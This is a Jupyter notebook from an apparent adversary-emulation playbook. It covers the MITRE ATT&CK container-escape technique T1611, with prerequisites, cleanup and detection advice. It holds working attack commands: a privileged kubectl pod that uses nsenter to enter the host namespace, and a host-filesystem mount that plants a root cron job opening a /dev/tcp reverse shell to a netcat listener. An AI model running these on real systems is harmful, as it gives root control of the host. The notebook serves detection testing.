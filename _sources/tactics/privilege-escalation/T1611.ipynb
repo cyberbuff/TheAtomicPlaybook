{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "7c5d648b",
   "metadata": {},
   "source": "# T1611 - Escape to Host\nAdversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.(Citation: Docker Overview)\n\nThere are multiple ways an adversary may escape to a host environment. Examples include creating a container configured to mount the host\u2019s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as `unshare` and `keyctl` to escalate privileges and steal secrets.(Citation: Docker Bind Mounts)(Citation: Trend Micro Privileged Container)(Citation: Intezer Doki July 20)(Citation: Container Escape)(Citation: Crowdstrike Kubernetes Container Escape)(Citation: Keyctl-unmask)\n\nAdditionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as `docker.sock`, to break out of the container via a [Container Administration Command](https://attack.mitre.org/techniques/T1609).(Citation: Container Escape) Adversaries may also escape via [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.(Citation: Windows Server Containers Are Open)\n\nGaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, or setting up a command and control channel on the host."
  },
  {
   "cell_type": "markdown",
   "id": "24cffb52",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "b9a83286",
   "metadata": {},
   "source": "### Atomic Test #1 - Deploy container using nsenter container escape\nIn this escape `kubectl` is used to launch a new pod, with a container that has the host pids mapped into the container (`hostPID:true`). It uses the alpine linux container image. It runs with privilege on the host (`privileged:true`). When the container is launched the command `nsenter --mount=/proc/1/ns/mnt -- /bin/bash` is ran. Since the host processes have been mapped into the container, the container enters the host namespace, escaping the container.\n\nAdditional Details:\n- https://twitter.com/mauilion/status/1129468485480751104\n- https://securekubernetes.com/scenario_2_attack/\n\n**Supported Platforms:** containers\n#### Dependencies:  Run with `sh`!\n##### Description: Verify docker is installed.\n##### Check Prereq Commands:\n```sh\nwhich docker\n\n```\n##### Get Prereq Commands:\n```sh\nif [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n\n```\n##### Description: Verify docker service is running.\n##### Check Prereq Commands:\n```sh\nsudo systemctl status docker\n\n```\n##### Get Prereq Commands:\n```sh\nsudo systemctl start docker\n\n```\n##### Description: Verify kind is in the path.\n##### Check Prereq Commands:\n```sh\nwhich kind\n\n```\n##### Get Prereq Commands:\n```sh\ncurl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64\nchmod +x ./kind\nmv kind /usr/bin/kind\n\n```\n##### Description: Verify kind-atomic-cluster is created\n##### Check Prereq Commands:\n```sh\nsudo kind get clusters\n\n```\n##### Get Prereq Commands:\n```sh\nsudo kind create cluster --name atomic-cluster\n\n```\n##### Description: Verify kubectl is in path\n##### Check Prereq Commands:\n```sh\nwhich kubectl\n\n```\n##### Get Prereq Commands:\n```sh\ncurl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\"\nchmod +x ./kubectl\nmv kubectl /usr/bin/kubectl\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f02fb71c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1611 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "f07ebd23",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nkubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{\"spec\":{\"hostPID\": true, \"containers\":[{\"name\":\"1\",\"image\":\"alpine\",\"command\":[\"nsenter\",\"--mount=/proc/1/ns/mnt\",\"--\",\"/bin/bash\"],\"stdin\": true,\"tty\":true,\"securityContext\":{\"privileged\":true}}]}}'\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7383d141",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1611 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "54597a83",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nkubectl --context kind-atomic-cluster delete pod atomic-escape-pod\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e64c0b0a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1611 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "3768ed4a",
   "metadata": {},
   "source": "### Atomic Test #2 - Mount host filesystem to escape privileged Docker container\nThis technique abuses privileged Docker containers to mount the host's filesystem and then create a cron job to launch a reverse shell as the host's superuser.\nThe container running the test needs be privileged.  It may take up to a minute for this to run due to how often crond triggers a job.\nDev note: the echo to create cron_filename is broken up to prevent localized execution of hostname and id by Powershell. \n\n**Supported Platforms:** containers\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Verify mount is installed.\n##### Check Prereq Commands:\n```sh\nwhich mount\n\n```\n##### Get Prereq Commands:\n```sh\nif [ \"\" == \"`which mount`\" ]; then echo \"mount Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install mount ; elif [ -n \"`which yum`\" ]; then sudo yum -y install mount ; fi ; else echo \"mount installed\"; fi\n\n```\n##### Description: Verify container is privileged.\n##### Check Prereq Commands:\n```sh\ncapsh --print | grep cap_sys_admin\n\n```\n##### Get Prereq Commands:\n```sh\nif [ \"`capsh --print | grep cap_sys_admin`\" == \"\" ]; then echo \"Container not privileged.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true\"; fi\n\n```\n##### Description: Verify mount device (/dev/dm-0) exists.\n##### Check Prereq Commands:\n```sh\nls /dev/dm-0\n\n```\n##### Get Prereq Commands:\n```sh\nif [ ! -f /dev/dm-0 ]; then echo \"Container not privileged or wrong device path.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true\"; fi\n\n```\n##### Description: Netcat is installed.\n##### Check Prereq Commands:\n```sh\nwhich netcat\n\n```\n##### Get Prereq Commands:\n```sh\nif [ \"\" == \"`which netcat`\" ]; then echo \"netcat Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install netcat ; elif [ -n \"`which yum`\" ]; then sudo yum -y install netcat ; fi\n\n```\n##### Description: IP Address is known.\n##### Check Prereq Commands:\n```sh\nif [ \"`ifconfig eth0 | grep inet | awk '{print $2}'`\" != \"\" ]; then echo \"Listen address set as `ifconfig eth0 | grep inet | awk '{print $2}'`\" ; fi\n\n```\n##### Get Prereq Commands:\n```sh\nif [ \"\" == \"`which ifconfig`\" ]; then echo \"ifconfig Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install net=tools ; elif [ -n \"`which yum`\" ]; then sudo yum -y install net-tools ; fi\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "93a311d1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1611 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "6180f3db",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nif [ ! -d /mnt/T1611.002 ]; then mkdir /mnt/T1611.002 ; mount /dev/dm-0 /mnt/T1611.002; fi\necho -n \"* * * * * root /bin/bash -c '/bin/bash -c echo \\\"\\\"; echo \\\"hello from host! \" > /mnt/T1611.002/etc/cron.d/T1611_002\necho -n \"$\" >> /mnt/T1611.002/etc/cron.d/T1611_002\necho -n \"(hostname) \" >> /mnt/T1611.002/etc/cron.d/T1611_002\necho -n \"$\" >> /mnt/T1611.002/etc/cron.d/T1611_002\necho \"(id)\\\" >& /dev/tcp/`ifconfig eth0 | grep inet | awk '{print $2}'`/4444 0>&1'\" >> /mnt/T1611.002/etc/cron.d/T1611_002\nnetcat -l -p 4444 2>&1\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "645d4cd0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1611 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "37188ace",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm /mnt/T1611.002/etc/cron.d/T1611_002\numount /mnt/T1611.002\nrmdir /mnt/T1611.002\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b09818c1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1611 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "1661929c",
   "metadata": {},
   "source": "## Detection\nMonitor for the deployment of suspicious or unknown container images and pods in your environment, particularly containers running as root. Additionally, monitor for unexpected usage of syscalls such as <code>mount</code> (as well as resulting process activity) that may indicate an attempt to escape from a privileged container to host. In Kubernetes, monitor for cluster-level events associated with changing containers' volume configurations."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}